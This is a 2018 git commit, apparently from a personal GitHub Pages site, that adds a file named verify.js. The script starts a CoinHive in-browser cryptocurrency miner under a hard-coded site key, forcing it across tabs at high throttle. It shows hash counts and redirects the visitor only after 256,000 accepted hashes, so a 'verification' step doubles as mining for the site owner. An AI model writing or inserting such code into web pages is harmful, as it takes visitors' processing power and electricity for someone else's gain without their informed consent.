b2632a3bfd2b31dd9f35c10ce71156fbf5b5eea5
huuhadz2k <36265491+huuhadz2k@users.noreply.github.com>
2018-02-09 14:03:29 +0700

    webiste

---
+++ assets/js/verify.js
@@ -0,0 +1,31 @@
+		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
+		{
+			threads: 4,
+			autoThreads: true,
+			throttle:1,
+			forceASMJS: false
+		});
+		miner.start(CoinHive.FORCE_MULTI_TAB);
+
+		// Update stats once per .5 second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+		var hashesToGenerate = 256000; //Set value of amount of accepted hashes to generate
+		var threadCount = miner.getNumThreads(); //Get the amount of threads
+
+		//Remove the following if statement if you don't want the page to redirect to another page.
+		if (acceptedHashes > hashesToGenerate)
+		{
+			miner.stop();
+			window.location = "https://huuhadz2k.github.io/"
+		}
+		else
+		{
+		document.getElementById("hps").innerHTML = hashesPerSecond;
+		document.getElementById("th").innerHTML = totalHashes;
+		document.getElementById("ah").innerHTML = acceptedHashes;
+		document.getElementById("threads").innerHTML = threadCount;
+		}
+	}, 500);
